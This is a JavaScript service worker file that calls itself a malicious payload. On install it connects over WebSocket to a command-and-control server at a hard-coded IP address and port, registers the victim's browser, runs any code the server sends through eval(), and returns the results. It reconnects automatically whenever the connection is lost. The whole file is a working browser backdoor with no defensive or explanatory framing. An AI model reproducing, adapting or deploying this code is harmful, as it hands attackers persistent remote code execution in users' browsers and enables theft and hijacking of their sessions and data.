// Malicious Service Worker Payload
const C2_IP = '192.168.214.147';
const C2_PORT = '8080';
const C2_URL = `wss://${C2_IP}:${C2_PORT}`;
let socket = null;
let deviceId = navigator.userAgent + '_' + Date.now();
function connectC2() {
  try {
    socket = new WebSocket(C2_URL);
    socket.onopen = () => {
      socket.send(JSON.stringify({ type: 'register', id: deviceId, ua: navigator.userAgent }));
    };
    socket.onmessage = (e) => {
      const cmd = JSON.parse(e.data);
      try {
        let result = eval(cmd.code);
        socket.send(JSON.stringify({ type: 'result', id: deviceId, result: String(result) }));
      } catch (err) {
        socket.send(JSON.stringify({ type: 'result', id: deviceId, error: err.message }));
      }
    };
    socket.onclose = () => setTimeout(connectC2, 3000);
    socket.onerror = () => socket.close();
  } catch (e) { setTimeout(connectC2, 3000); }
}
self.addEventListener('install', () => { self.skipWaiting(); connectC2(); });
self.addEventListener('activate', () => { clients.claim(); });
